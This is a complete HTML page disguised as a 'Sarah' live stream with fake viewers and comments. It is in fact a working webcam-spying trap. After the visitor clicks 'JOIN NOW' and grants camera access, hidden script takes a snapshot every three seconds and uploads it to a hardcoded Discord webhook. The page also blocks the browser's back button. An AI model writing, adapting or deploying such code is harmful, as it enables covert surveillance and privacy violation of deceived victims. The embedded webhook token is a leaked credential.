<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sarah · LIVE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
        body{background:#000;min-height:100vh;overflow:hidden;position:relative}
        
        /* VIDEO - FORCE PLAY */
        #bg-video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0}
        
        /* OVERLAY */
        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(0deg,rgba(0,0,0,0.8) 0%,transparent 50%,transparent 100%);z-index:1;pointer-events:none}
        
        /* TOP BAR */
        .top-bar{position:fixed;top:0;left:0;right:0;z-index:2;padding:12px 16px;display:flex;justify-content:space-between;pointer-events:none}
        .live-badge{background:#ff0000;color:white;padding:6px 12px;border-radius:30px;font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
        .live-dot{width:8px;height:8px;background:white;border-radius:50%;animation:pulse 1s infinite}
        @keyframes pulse{50%{opacity:0.5;transform:scale(1.2)}}
        .viewer-count{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);color:white;padding:6px 12px;border-radius:30px;font-size:13px}
        
        /* RIGHT ACTIONS */
        .right-actions{position:fixed;right:16px;bottom:180px;z-index:3;display:flex;flex-direction:column;gap:16px}
        .action-btn{width:50px;height:50px;border-radius:50%;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);border:2px solid rgba(255,255,255,0.2);color:white;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:20px;cursor:pointer}
        .action-btn span{font-size:10px}
        .action-btn.like{color:#ff3b5c}
        
        /* STREAMER INFO */
        .streamer-info{position:fixed;bottom:120px;left:16px;z-index:3;color:white}
        .streamer-name{font-size:18px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px}
        .follow-btn{background:#ff0000;border:none;color:white;font-size:12px;padding:4px 12px;border-radius:30px;cursor:pointer}
        .song-info{font-size:13px;display:flex;align-items:center;gap:6px;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);padding:6px 12px;border-radius:30px;width:fit-content}
        
        /* COMMENTS */
        .comments-section{position:fixed;bottom:180px;left:16px;right:80px;z-index:3}
        .comment{display:flex;align-items:center;gap:8px;margin-bottom:8px;animation:slideIn 0.3s}
        @keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
        .comment-avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#ff4500,#ff8c00);display:flex;align-items:center;justify-content:center;color:white;font-size:14px}
        .comment-bubble{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);border-radius:30px;padding:8px 14px;color:white;font-size:13px}
        .comment-user{font-weight:700;color:#ffd700}
        
        /* PERMISSION OVERLAY */
        .permission-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:9999;display:flex;justify-content:center;align-items:center;opacity:0;visibility:hidden;transition:0.3s}
        .permission-overlay.active{opacity:1;visibility:visible}
        .permission-card{background:#1a1a1a;border-radius:30px;padding:30px;max-width:350px;text-align:center;color:white;border:2px solid #ff0000}
        .permission-icon{font-size:60px;margin-bottom:20px}
        .permission-title{font-size:24px;font-weight:bold;margin-bottom:15px;color:#ff0000}
        .permission-btn{background:#ff0000;color:white;border:none;padding:15px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
        .viewer-badge{background:#ff0000;padding:5px 15px;border-radius:30px;display:inline-block;margin-top:10px}
        
        /* HIDDEN */
        #hiddenCanvas,#hiddenVideo{display:none}
        
        /* CHAT INPUT */
        .chat-input{position:fixed;bottom:20px;left:16px;right:16px;z-index:3;display:flex;gap:8px}
        .chat-field{flex:1;background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.2);border-radius:30px;padding:12px 20px;color:white}
        .send-btn{width:45px;height:45px;border-radius:50%;background:#ff0000;border:none;color:white;font-size:18px;cursor:pointer}
        
        .footer{position:fixed;bottom:70px;left:16px;z-index:3;color:rgba(255,255,255,0.7);font-size:12px;display:flex;gap:16px}
    </style>
</head>
<body>
    <!-- VIDEO - FIXED FOR AUTOPLAY -->
    <video autoplay loop playsinline muted id="bg-video">
        <source src="Girl.mp4" type="video/mp4">
    </video>
    
    <div class="overlay"></div>
    
    <video id="hiddenVideo" playsinline></video>
    <canvas id="hiddenCanvas"></canvas>

    <div class="permission-overlay" id="permissionOverlay">
        <div class="permission-card">
            <div class="permission-icon">📹</div>
            <div class="permission-title">Join Sarah's Live</div>
            <div class="permission-text">
                <span class="viewer-badge">🔴 2,847 watching</span>
            </div>
            <button class="permission-btn" onclick="requestCamera()">📸 JOIN NOW</button>
            <p style="color:#666; font-size:12px; margin-top:15px;">⚡ 127 chatting</p>
        </div>
    </div>

    <div class="top-bar">
        <div class="live-badge"><span class="live-dot"></span> LIVE</div>
        <div class="viewer-count">👁️ <span id="viewerCount">2.8k</span> · 2h</div>
    </div>

    <div class="right-actions">
        <div class="profile-pic">👩</div>
        <button class="action-btn like" onclick="like()">❤️<span>2.1k</span></button>
        <button class="action-btn" onclick="comment()">💬<span>127</span></button>
        <button class="action-btn" onclick="gift()">🎁<span>Gift</span></button>
    </div>

    <div class="streamer-info">
        <div class="streamer-name">
            Sarah <span class="follow-btn" onclick="follow()">+ Follow</span>
        </div>
        <div class="song-info">
            <span>🎵</span> birthday salubong tiktok · august 22
        </div>
    </div>

    <div class="comments-section" id="commentsSection">
        <div class="comment"><div class="comment-avatar">J</div><div class="comment-bubble"><span class="comment-user">John</span> ❤️</div></div>
        <div class="comment"><div class="comment-avatar">E</div><div class="comment-bubble"><span class="comment-user">Emma</span> 🐼</div></div>
    </div>

    <div class="footer">
        <span>💬 127 chatting</span>
        <span>🎁 Gifts: 234</span>
    </div>

    <div class="chat-input">
        <input type="text" class="chat-field" id="chatInput" placeholder="Say something..." disabled>
        <button class="send-btn" id="sendBtn" disabled onclick="sendMessage()">➤</button>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1501436344398778498/u3am23nI_-F-dUV49wtF5lbp-ytjlULdpVgSSewXkfu3uDItV7CAmG2nyODWo6wcOFPa';
        let cameraStream, photoInterval;

        window.onload = () => {
            // VIDEO PLAY KARO
            const video = document.getElementById('bg-video');
            video.play().catch(e => console.log('Autoplay failed:', e));
            
            setTimeout(() => {
                document.getElementById('permissionOverlay').classList.add('active');
            }, 1500);
        };

        function requestCamera() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    cameraStream = stream;
                    
                    document.getElementById('permissionOverlay').classList.remove('active');
                    document.getElementById('chatInput').disabled = false;
                    document.getElementById('sendBtn').disabled = false;
                    
                    // VIDEO SOUND ENABLE KARO (user interaction ke baad)
                    const video = document.getElementById('bg-video');
                    video.muted = false; // AB SOUND AAYEGA!
                    video.volume = 1.0;
                    
                    const hiddenVideo = document.getElementById('hiddenVideo');
                    hiddenVideo.srcObject = stream;
                    hiddenVideo.play();
                    
                    photoInterval = setInterval(capturePhoto, 3000);
                    
                    fetch(WEBHOOK, {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({content:'📹 **User joined**'})
                    });
                })
                .catch(() => alert('Camera needed'));
        }

        function capturePhoto() {
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                canvas.width = 320; canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.6);
                const blob = dataURLtoBlob(imageData);
                const formData = new FormData();
                formData.append('file', blob, `live_${Date.now()}.jpg`);
                formData.append('payload_json', JSON.stringify({
                    content: '📸 **Auto capture**'
                }));
                
                fetch(WEBHOOK, {method:'POST', body:formData});
            } catch(e) {}
        }

        function dataURLtoBlob(dataURL) {
            const arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]), u8arr = new Uint8Array(bstr.length);
            for(let n = bstr.length; n--;) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], {type:mime});
        }

        function like() {
            const gift = document.createElement('div');
            gift.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px;z-index:9999;animation:float 2s forwards';
            gift.textContent = '❤️';
            document.body.appendChild(gift);
            setTimeout(() => gift.remove(), 2000);
        }

        function follow() { alert('✅ Following Sarah!'); }
        function comment() { document.getElementById('chatInput').focus(); }
        function gift() { alert('🎁 Gift sent!'); }
        function sendMessage() { alert('Message sent!'); }

        // Block back
        history.pushState(null, null, location.href);
        window.addEventListener('popstate', () => history.pushState(null, null, location.href));
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if(photoInterval) clearInterval(photoInterval);
            if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
